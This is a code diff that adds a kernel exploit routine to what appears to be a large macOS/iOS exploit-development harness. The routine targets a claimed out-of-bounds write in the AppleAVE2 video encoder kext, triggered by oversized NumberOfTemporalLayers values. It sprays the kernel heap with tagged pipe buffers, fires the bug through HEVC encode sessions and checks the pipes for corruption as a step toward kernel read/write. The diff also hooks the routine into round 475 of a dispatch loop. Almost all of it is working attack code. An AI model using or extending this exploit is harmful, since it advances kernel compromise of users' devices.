@@ -17340,6 +17340,247 @@ static void *r470_osc_thread(void *arg) {
     return NULL;
 }
 
+/* ================================================================
+ * r472_exploit — CVE-2026-112705: AppleAVE2 OOB write via
+ * NumberOfTemporalLayers.
+ *
+ * Setting NumberOfTemporalLayers to a value larger than the kext's
+ * internal buffer causes an out-of-bounds write during the first
+ * encode.  The kext allocates metadata for a small fixed number of
+ * temporal layers but uses the user-supplied count in its write loop.
+ *
+ * Strategy:
+ *   Phase A — Probe: test which NumberOfTemporalLayers values are
+ *             accepted by VTSessionSetProperty and PrepareToEncode.
+ *   Phase B — Pipe spray: fill kernel heap with pipe buffers so the
+ *             OOB write lands on a pipe's buffer metadata.
+ *   Phase C — Trigger: encode one frame with the chosen value.
+ *   Phase D — Check pipes for corruption → kernel R/W.
+ * ================================================================ */
+
+#define R472_PIPE_COUNT    512
+#define R472_PIPE_BUF_SZ   16384
+#define R472_SPRAY_TAG     0xDEAD0472
+
+static void r472_ave_callback(void *ref, void *src, OSStatus st,
+                               VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
+    if (ref) (*(int *)ref)++;
+}
+
+static VTCompressionSessionRef r472_create_session(int w, int h, int *cb_count) {
+    CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
+        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+        &kCFTypeDictionaryValueCallBacks);
+    CFDictionaryRef iop = CFDictionaryCreate(
+        kCFAllocatorDefault, NULL, NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
+    CFRelease(iop);
+
+    int pixfmt = kCVPixelFormatType_32BGRA;
+    CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt);
+    CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn);
+    CFRelease(fn);
+
+    VTCompressionSessionRef sess = NULL;
+    OSStatus st = VTCompressionSessionCreate(
+        kCFAllocatorDefault, w, h, kCMVideoCodecType_HEVC,
+        NULL, sa, NULL, r472_ave_callback, cb_count, &sess);
+    CFRelease(sa);
+    if (st != noErr) {
+        rlog("    Session create failed: %d\n", (int)st);
+        return NULL;
+    }
+    return sess;
+}
+
+static OSStatus r472_set_int(VTCompressionSessionRef s, CFStringRef k, int v) {
+    CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
+    OSStatus st = VTSessionSetProperty(s, k, n);
+    CFRelease(n);
+    return st;
+}
+
+static int r472_encode_one(VTCompressionSessionRef sess) {
+    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(sess);
+    if (!pool) { rlog("    No pixel buffer pool\n"); return -1; }
+
+    CVPixelBufferRef pb = NULL;
+    CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
+    if (!pb) { rlog("    Failed to create pixel buffer\n"); return -2; }
+
+    CVPixelBufferLockBaseAddress(pb, 0);
+    void *base = CVPixelBufferGetBaseAddress(pb);
+    if (base) memset(base, 0x41, CVPixelBufferGetDataSize(pb));
+    CVPixelBufferUnlockBaseAddress(pb, 0);
+
+    OSStatus st = VTCompressionSessionEncodeFrame(
+        sess, pb, CMTimeMake(0, 30), CMTimeMake(1, 30), NULL, NULL, NULL);
+    CVPixelBufferRelease(pb);
+    if (st != noErr) {
+        rlog("    EncodeFrame error: %d\n", (int)st);
+        return -3;
+    }
+    VTCompressionSessionCompleteFrames(sess, kCMTimeInvalid);
+    return 0;
+}
+
+static void r472_exploit(void) {
+    rlog("\n=== r472: CVE-2026-112705 — AVE2 NumberOfTemporalLayers OOB ===\n\n");
+    fflush(stdout);
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* ---- Phase A: Probe NumberOfTemporalLayers acceptance ---- */
+    rlog("  --- Phase A: Probe NumberOfTemporalLayers values ---\n");
+    fflush(stdout);
+
+    int test_vals[] = {2, 3, 4, 5, 6, 7, 8, 10, 12, 16, 24, 32, 48, 64, 128, 255};
+    int n_tests = sizeof(test_vals) / sizeof(test_vals[0]);
+
+    for (int i = 0; i < n_tests; i++) {
+        int val = test_vals[i];
+        int cb = 0;
+        VTCompressionSessionRef sess = r472_create_session(640, 480, &cb);
+        if (!sess) continue;
+
+        r472_set_int(sess, CFSTR("EncoderUsage"), 1);
+        VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+
+        OSStatus st = r472_set_int(sess, CFSTR("NumberOfTemporalLayers"), val);
+        if (st != noErr) {
+            rlog("    NTL=%d: SetProperty REJECTED (%d)\n", val, (int)st);
+            VTCompressionSessionInvalidate(sess); CFRelease(sess);
+            continue;
+        }
+
+        st = VTCompressionSessionPrepareToEncodeFrames(sess);
+        if (st != noErr) {
+            rlog("    NTL=%d: Prepare FAILED (%d)\n", val, (int)st);
+            VTCompressionSessionInvalidate(sess); CFRelease(sess);
+            continue;
+        }
+
+        rlog("    NTL=%d: Prepare OK, encoding...\n", val);
+        fflush(stdout);
+
+        int rc = r472_encode_one(sess);
+        rlog("    NTL=%d: encode rc=%d cb=%d\n", val, rc, cb);
+
+        VTCompressionSessionInvalidate(sess);
+        CFRelease(sess);
+
+        if (val >= 32) break;
+    }
+    fflush(stdout);
+
+    /* ---- Phase B: Pipe spray ---- */
+    rlog("\n  --- Phase B: Pipe buffer spray (%d pipes) ---\n", R472_PIPE_COUNT);
+    fflush(stdout);
+
+    int pipes[R472_PIPE_COUNT][2];
+    int pipe_ok = 0;
+    uint32_t tag = R472_SPRAY_TAG;
+
+    for (int i = 0; i < R472_PIPE_COUNT; i++) {
+        if (pipe(pipes[i]) < 0) {
+            pipes[i][0] = pipes[i][1] = -1;
+            continue;
+        }
+        uint8_t fill[R472_PIPE_BUF_SZ];
+        memset(fill, 0, sizeof(fill));
+        uint32_t *hdr = (uint32_t *)fill;
+        hdr[0] = tag;
+        hdr[1] = (uint32_t)i;
+        hdr[2] = 0xCAFEBABE;
+        hdr[3] = 0x47474747;
+        ssize_t w = write(pipes[i][1], fill, sizeof(fill));
+        if (w == (ssize_t)sizeof(fill)) pipe_ok++;
+    }
+    rlog("    Sprayed %d / %d pipe buffers\n", pipe_ok, R472_PIPE_COUNT);
+    fflush(stdout);
+
+    /* ---- Phase C: Trigger OOB write ---- */
+    rlog("\n  --- Phase C: Trigger OOB (NTL=8, then NTL=16) ---\n");
+    fflush(stdout);
+
+    int trigger_vals[] = {8, 12, 16};
+    int n_trigger = sizeof(trigger_vals) / sizeof(trigger_vals[0]);
+
+    for (int ti = 0; ti < n_trigger; ti++) {
+        int ntl = trigger_vals[ti];
+        int cb = 0;
+        VTCompressionSessionRef sess = r472_create_session(640, 480, &cb);
+        if (!sess) continue;
+
+        r472_set_int(sess, CFSTR("EncoderUsage"), 1);
+        VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+
+        OSStatus st = r472_set_int(sess, CFSTR("NumberOfTemporalLayers"), ntl);
+        if (st != noErr) {
+            rlog("    Trigger NTL=%d: SetProperty REJECTED\n", ntl);
+            VTCompressionSessionInvalidate(sess); CFRelease(sess);
+            continue;
+        }
+
+        st = VTCompressionSessionPrepareToEncodeFrames(sess);
+        if (st != noErr) {
+            rlog("    Trigger NTL=%d: Prepare FAILED\n", ntl);
+            VTCompressionSessionInvalidate(sess); CFRelease(sess);
+            continue;
+        }
+
+        rlog("    Trigger NTL=%d: encoding...\n", ntl);
+        fflush(stdout);
+
+        int rc = r472_encode_one(sess);
+        rlog("    Trigger NTL=%d: encode rc=%d cb=%d\n", ntl, rc, cb);
+
+        VTCompressionSessionInvalidate(sess);
+        CFRelease(sess);
+        fflush(stdout);
+    }
+
+    /* ---- Phase D: Check pipes for corruption ---- */
+    rlog("\n  --- Phase D: Check pipe buffers for corruption ---\n");
+    fflush(stdout);
+
+    int corrupted = 0;
+    for (int i = 0; i < R472_PIPE_COUNT; i++) {
+        if (pipes[i][0] < 0) continue;
+
+        uint8_t buf[R472_PIPE_BUF_SZ];
+        ssize_t r = read(pipes[i][0], buf, sizeof(buf));
+        close(pipes[i][0]);
+        close(pipes[i][1]);
+
+        if (r < 16) continue;
+
+        uint32_t *hdr = (uint32_t *)buf;
+        if (hdr[0] != tag || hdr[1] != (uint32_t)i ||
+            hdr[2] != 0xCAFEBABE || hdr[3] != 0x47474747) {
+            corrupted++;
+            rlog("    *** PIPE %d CORRUPTED: %08x %08x %08x %08x ***\n",
+                 i, hdr[0], hdr[1], hdr[2], hdr[3]);
+            if (corrupted <= 4) {
+                rlog("    Bytes: ");
+                for (int j = 0; j < 32 && j < (int)r; j++)
+                    rlog("%02x ", buf[j]);
+                rlog("\n");
+            }
+        }
+    }
+
+    if (corrupted == 0) {
+        rlog("    No pipe corruption detected (OOB may not reach pipe buffers)\n");
+    } else {
+        rlog("    *** %d pipes corrupted — OOB write confirmed! ***\n", corrupted);
+    }
+
+    rlog("\n=== r472 done ===\n");
+    fflush(stdout);
+}
+
 static void r470_exploit(void) {
     rlog("\n=== r470: ClearSword-style TOCTOU ===\n\n");
     fflush(stdout);
@@ -87801,6 +88042,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 475) {
+            rlog("*** rounds=475: CVE-2026-112705 AVE2 NumberOfTemporalLayers OOB ***\n\n");
+            fflush(stdout);
+            r472_exploit();
+            goto done;
+        }
         if (rounds == 474) {
             rlog("*** rounds=474: 8-page IOSurface + large IOV TOCTOU ***\n\n");
             fflush(stdout);
@@ -90666,7 +90913,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
